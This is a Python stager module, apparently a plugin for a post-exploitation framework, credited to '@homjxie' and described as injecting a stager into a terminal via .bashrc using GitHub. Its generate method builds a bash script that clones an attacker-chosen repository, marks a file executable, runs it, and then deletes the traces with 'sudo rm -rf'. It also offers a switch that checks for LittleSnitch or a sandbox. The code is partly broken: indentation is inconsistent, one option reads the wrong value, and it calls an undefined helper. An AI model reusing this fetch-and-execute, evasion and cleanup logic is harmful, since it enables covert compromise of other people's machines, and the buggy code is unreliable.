
class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': ' inject Payload Via Github',

            'Author': '@homjxie',

            'Description': ('inject Stager in Terminal Via bashrc Via Github.'),

            'Comments': [
                'https://twitter.com/homjxi0e'
            ]
        }


        self.options = {


            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'python'
           },
           'URL-Dl-Github' : {
                'Description'   :   'add Name Folder.',
                'Required'      :   True,
                'Value'         :   ''

           },
           'Name-File' : {
                'Description'   :   'add Name Folder.',
                'Required'      :   True,
                'Value'         :   ''
           },
           'Files-Stager' : {
               'Description'   :   'add Name File Stager.',
               'Required'      :   True,
               'Value'         :   ''
           },
           'D-E-Name-File2' : {
               'Description'   :   'Add Name Folder.',
               'Required'      :   True,
               'Value'         :   ''
           },
           'File-Stager3' : {
               'Description'   :   'add Name File Stager.',
               'Required'      :   True,
               'Value'         :   ''
           },
           'Files-Stager6' : {
               'Description'   :   'add Name File Stager.',
               'Required'      :   True,
               'Value'         :   ''

            },
            'OutFile' : {
                'Description'   :   'File to output Bash script to, otherwise displayed on the screen.',
                'Required'      :   True,
                'Value'         :   '/tmp/.bashrc'
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }



        self.mainMenu = mainMenu

        for param in params:

            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):


        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']
	OutFile = self.options['SafeChecks']['Value']


        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

	if OutFile == "":
            print Path.color("[!] Error In Path Man !!! .")
            return ""

        else:
	    script =  "git clone \"" + self.options['URL-Dl-Github']['Value'] + "\"\n"
        script += "cd \"" + self.options['Name-File']['Value'] + "\"\n"
        script += "chmod +x \"" + self.options['Files-Stager']['Value'] + "\"\n"
        script += "./\"" + self.options['Files-Stager6']['Value'] + "\"\n"
        script += "sudo rm -rf \"" + self.options['D-E-Name-File2']['Value'] + "\"\n"
        script += "rm \"" + self.options['File-Stager3']['Value'] + "\"\n"
        return script
